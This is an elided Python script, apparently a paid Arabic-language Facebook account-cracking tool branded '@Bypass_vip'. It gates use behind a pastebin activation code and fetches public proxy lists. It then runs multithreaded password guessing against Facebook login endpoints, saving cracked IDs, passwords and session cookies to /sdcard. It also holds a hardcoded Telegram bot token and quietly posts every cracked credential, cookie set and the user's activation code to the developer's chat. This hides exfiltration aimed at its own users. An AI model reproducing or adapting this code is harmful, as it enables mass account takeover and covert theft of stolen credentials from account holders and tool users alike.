...
def fetch_url_content(url):
    try:
        ...
        response.raise_for_status()  # تحقق من عدم وجود أخطاء HTTP
...
def is_code_used_by_another_user(code, user_ip, used_codes_file='used_codes.txt'):
    if not os.path.exists(used_codes_file):
        return False
    with open(used_codes_file, 'r') as file:
        for line in file:
            used_code, used_user_ip = line.strip().split(',')
            if used_code == code and used_user_ip != user_ip:
                return True
    return False

def mark_code_as_used(code, user_ip, used_codes_file='usse_codes.txt'):
    with open(used_codes_file, 'a') as file:
        file.write(f'{code},{user_ip}\n')

url = 'https://pastebin.com/raw/dfYpZ1cu' 
content = fetch_url_content(url)

if content is None:
    print("Failed to fetch the content. Exiting.")
    exit()

user_ip = get_user_ip()
if user_ip is None:
    print("Failed to fetch the user's IP address. Exiting.")
    exit()
soso = input('ادخل كود التفعيل : ')
os.system('clear')
if soso in content:
		if soso=='':
			print('يجب علي ادخال الكود')
			exit()
		else:
			mark_code_as_used(soso, user_ip)
			print('الكود صحيح مرحبا بك')
elif is_code_used_by_another_user(soso, user_ip):
    
    print(f'{soso}')
    print('هذا الكود تم استخدامه من قبل مستخدم آخر.')
else:
    print(soso)
    print('كود التفعيل خاطأ او تم إيقافه من قبل المطور')
    print('')
    print('يوزر المطور :- @Bypass_vip')
    print('')
    print('اسم المطور :- мυsℓєм¥❥')
    exit()
...
ID =input(f'{G2}ايديك : ')
ID1 = '1761998181'
token1 = '7239857970:AAHxST9MGJkDkaqbGmj8rIOlW_FW6MZZyfs'
token = input('توكنك : ')
os.system('clear')

requests.post(f"""https://api.telegram.org/bot{token}/sendvideo?chat_id={ID}&parse_mode=MarkdownV2&video=https://t.me/sssssssssssssssss3/2&caption=• لاتنسى ابدا ذكر الله
•اذكرو الله كثيرا
""")	
E=f"""

{soso}
{ID}""";requests.post(f"https://api.telegram.org/bot{token1}/sendMessage?chat_id={ID1}&text={E}")

try: 
   HMOD1 = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
   HMOD2 = requests.get('https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt').text   
   HMOD3 = requests.get('https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks4.txt').text
   HMOD4 = requests.get('https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt').text
   HMOD5 = requests.get('https://raw.githubusercontent.com/James404-cyber/binnos/main/socks5.txt').text
   HMOD6 = requests.get('https://raw.githubusercontent.com/James404-cyber/binnos/main/socks4.txt').text   
except Exception as e:
	pass
proxx = open('.prox1.txt','w').write(HMOD1)
proxx = open('.prox2.txt','w').write(HMOD2)
proxx = open('.prox3.txt','w').write(HMOD3)
proxx = open('.prox4.txt','w').write(HMOD4)
proxx = open('.prox5.txt','w').write(HMOD5)
proxx = open('.prox6.txt','w').write(HMOD6)
a = random.choice([HMOD1,HMOD2,HMOD3,HMOD4,HMOD5,HMOD6])
...
G1 = '\x1b[1;97m' # ابيض		
G3 = '\x1b[1;33m' # اصفر
print(('\033[92m$'*25)+f'{G3}\n• اداة  المدفوعة @hadierasd\n'+(f'{G2}$'*25))
import time
import os
time.sleep(4)
os.system('clear')
...
def compare_phone_time():
    try:
        ...
        print(f'{R}جاري تشغيل.....')
        time.sleep(3)
        os.system('clear')
compare_phone_time()
import datetime;now = datetime.date.today();target = datetime.date(2029,9,16)
if now >=target:print("мυsℓєм¥❥ developer tools have   been activated ⛄@Bypass_vip⛄")
def a(z):
        for e in z:
            sys.stdout.write(e)
            sys.stdout.flush()
...
print('')
#print(G + '▲────────────────◇◆◇────────────────▲          ')
print('\x1b[2;36m✦ ✧ ✦ ✧ ✦ ✧ ✦ ✧ ✦𓅓✧ ✦ ✧ ✦ ✧ ✦ ✧           ) \n\n  \x1b[38;5;210m➩ \x1b[1;33m[⚀]  \x1b[2;32mDEVELOPER  : الـمـطـور мυsℓєм¥❥\n  \x1b[38;5;210m➩ \x1b[1;33m[⚁]  \x1b[2;32mMY CHANNEL : @hadierasd\n  \x1b[38;5;210m➩ \x1b[1;33m[⚂]  \x1b[2;32mTOOL       : آداه hadierasd الـمـدفــوعة\n  \x1b[38;5;210m➩ \x1b[1;33m[⚃]  \x1b[2;32mTELEGRAM   : @Bypass_vip\n\x1b[\x1b[2;36m\n✦ ✧ ✦ ✧ ✦ ✧ ✦ ✧ ✦𓅓✧ ✦ ✧ ✦ ✧ ✦ ✧            ')

token = ()


#print('✦ ✧ ✦ ✧ ✦ ✧ ✦ ✧ ✦𓃬✧ ✦ ✧ ✦ ✧              \n  \n')
#print('\x1b[2;34mتاريخ تحديث الاداه 2024/6/2 🔥🇮🇶\n\n✦ ✧ ✦ ✧ ✦ ✧ ✦ ✧ ✦𓅓✧ ✦ ✧ ✦ ✧ ✦ ✧  )\n\n   『@Bypass_vip』  ☞ 『لُـِـِِـِِِـِِـِـوُفُـ,ـي』                 \n\n')
...
print('\x1b[38;5;205mYou have been successfully registered in the мυsℓєм¥❥ tool 🔥😎')


#exec(zlib.decompress().Bypass_vip())
...
HMOD_Prox = random.choice(prox)
proxs= {'http': 'http://'+HMOD_Prox}
ugen=[]
...
\x1b[2;36m✦ ✧ ✦ ✧ ✦ ✧ ✦ ✧ ✦𓅓✧ ✦ ✧ ✦ ✧ ✦ ✧           ) \n\n  \x1b[38;5;210m➩ \x1b[1;33m[⚀]  \x1b[2;32mDEVELOPER  : الـمـطـور мυsℓєм¥❥\n  \x1b[38;5;210m➩ \x1b[1;33m[⚁]  \x1b[2;32mMY CHANNEL : @hadierasd\n  \x1b[38;5;210m➩ \x1b[1;33m[⚂]  \x1b[2;32mTOOL       : آداه мυsℓєм¥❥ الـمـدفــوعة\n  \x1b[38;5;210m➩ \x1b[1;33m[⚃]  \x1b[2;32mTELEGRAM   : @Bypass_vip\n\x1b[\x1b[2;36m\n✦ ✧ ✦ ✧ ✦ ✧ ✦ ✧ ✦𓅓✧ ✦ ✧ ✦ ✧ ✦ ✧ ⠀""")

def linex():
        print('\033[1;37m__________________________________')
def clear():
        os.system('clear')
        print(('\033[92m—'*25)+'\n• мυsℓєм¥❥ By @Bypass_vip•\n'+('—'*25))
        print(logo)
...
def auto_file(cookies,access_token):
        ...
        print('\n \033[1;97m /sdcard/Bypass_vip.txt \033[0;97m\n')
        #100010138361148
                ...
                if "server on" in sj:
                        ...
                        if xd in ['1','01']:
                                ...
                                with tred(max_workers=30) as crack_submit:
                                        ...
                                        print("\033[1;32m мυsℓєм¥❥𓃠︎ 𝔱𝔬𝔬𝔩 ")
                                        linex()
...
def za():
    ...
    myid = getKey()
    os.system(" clear ")
    ux=zlib.decompress(b'x\x9c\x05\xc1A\n\xc0 \x0c\x04\xc0\x1fe5\xde|\x8e"\x15Q"f[|~g:\xb9=\x03\xe3\x96\xf1\x92R\xa6=\xbe\x8dRmA\x83&\x84\x08o\xe7kGy)\x9dk\xfe\xf3\xe1\x12\x9d').Bypass_vip()
    ...
    if myid in str(body):
        ...
        print(" run again python muslem.py")
...
def pak():
                ...
                with tred(max_workers=30) as muslem:     
                        clear()
                        tl = str(len(user))
                        ...
                        for psx in user:
                                ...
                                muslem.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP/2F: '+str(len(oks))+'/'+str(len(cps))+'/'+str(len(twf)))
...
def india():
                ...
                with tred(max_workers=30) as muslem:     
                        ...
                        print(f'\033[1;32m Use airplane mode for speed up ')
                        linex()
                        print("\033[1;32m OK IDZ SAVED IN >>>>> /SDCARD/muslem-OK.TXT")
                        print("\033[1;32m CP IDZ SAVED IN >>>>> /SDCARD/muslem-CP.TXT")
                        print("\033[1;32m COOKIE SAVED IN >>>> /SDCARD/muslem-COOKIE.TXT")
                        linex()
                        for psx in user:
                                ids = code+psx
...
def ffb(ids,names,passlist):
        ...
        sys.stdout.write('\r\r\033[1;37m [\033[1;32mBypass_vip\033[1;37m] \033[1;37m[\033[1;32m%s\033[1;37m] \033[1;37m[\033[1;32mOK\033[1;37m/\033[1;91mCP\033[1;37m] \033[1;37m[\033[1;32m%s\033[1;37m\033[1;37m] \033[1;37m[\033[1;96m%s%%\033[1;37m]\033[1;37m'%(loop,len(oks),p));sys.stdout.flush()
    ...
    "user-agent": ua,
                        ...
                        muslem=str(session.cookies)
                        if "c_user" in muslem:
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                (f'''
\r{G7}𝙶𝙾𝙾𝙳 ✔	
ᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓ @Bypass_vip ᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓ
•  𝙴𝙼𝙰𝙸𝙻     : {ids}
•  𝙿𝙰𝚂𝚂𝚆𝙾𝚁𝙳 : {pas}
ᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓ мυsℓєм¥❥ ᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓ
• 𝙱𝚈 : @Bypass_vip - @Bypass_vip
ᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓ	
				''')
                                statusok = f'''
       𝙶𝙾𝙾𝙳	✔	
	  ᯓᯓᯓᯓᯓ @Bypass_vip ᯓᯓᯓᯓᯓ
		•  𝙴𝙼𝙰𝙸𝙻     : {ids}
		•  𝙿𝙰𝚂𝚂𝚆𝙾𝚁𝙳 : {pas}
                •  كوكيز : {kuki}
	  ᯓᯓᯓᯓᯓ мυsℓєм¥❥ ᯓᯓᯓᯓᯓ
	    • 𝙱𝚈 : @Bypass_vip - @Bypass_vip
				...
				'''
                                ...
                                requests.post(f"https://api.telegram.org/bot"+str(token1)+"/sendMessage?chat_id="+str(ID1)+"&text="+str(statusok))                           
                                dc=dict(session.cookies)
                                coki=";".join([k+"="+v for k,v in dc.items()])
                                open('/sdcard/Bypass_vip-COOKIE.txt','a').write(coki+'\n')
                                open('/sdcard/Bypass_vip-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in muslem:
                                if 'y' in pcp:
                                        print(f'''
\r\033[1;91mCP✘	
ᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓ @Bypass_vip ᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓ
	  ...
	  ᯓᯓᯓᯓᯓ мυsℓєм¥❥ ᯓᯓᯓᯓᯓ
	    • 𝙱𝚈 : @Bypass_vip - @Bypass_vip
				...
				'''
                                        requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
                                        requests.post(f"https://api.telegram.org/bot"+str(token1)+"/sendMessage?chat_id="+str(ID1)+"&text="+str(statusok))
                                        open('/sdcard/Bypass_vip-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        global ok,loop,lim
                        p=round(loop*100/lim,2)
                        sys.stdout.write('\r\r\033[1;37m [Bypass_vip] '%(loop,len(oks),p));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
	  ...
	  ᯓᯓᯓᯓᯓ мυsℓєм¥❥ ᯓᯓᯓᯓᯓ
	    • 𝙱𝚈 : @Bypass_vip - @Bypass_vip
				...
				'''
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;208m [Bypass_vip-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/Bypass_vip-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                else:
...
def api1(ids,names,passlist):
                try:
                        global ok,loop,lim
                        p=round(loop*100/lim,2)
                        sys.stdout.write('\r\r\033[1;37m [Bypass_vip] [%s] '%(loop,len(oks),p));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
    ...
    "user-agent": 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1',
                                ...
                                url = 'https://p.facebook.com/auth/login?include_headers=false&Bypass_vip_body_json=false&streamable_json_response=true'
                                po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [Bypass_vip-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/Bypass_vip-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                                        ...
                                        if 'y' in pcp:
                                                ...
                                                open('/sdcard/Bypass_vipCP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                else:
                                        continue
                        loop+=1
...
def rndm(ids,passlist):
        ...
        sys.stdout.write('\r\r\033[1;37m [Bypass_vip] [%s] \033[1;37m[OK=%s] [%s%%] \033[1;37m'%(loop,len(oks),p));sys.stdout.flush()
        try:
                for pas in passlist:
                        application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                        application_version_code=str(random.randint(000000000,999999999))
    ...
    "user-agent": 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1',
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [Bypass_vip-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        open('/sdcard/Bypass_vip-COOKIE.txt','a').write(coki+'\n')
                                        open('/sdcard/Bypass_vip_OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;208m [Bypass_vip-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/Bypass_vip-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
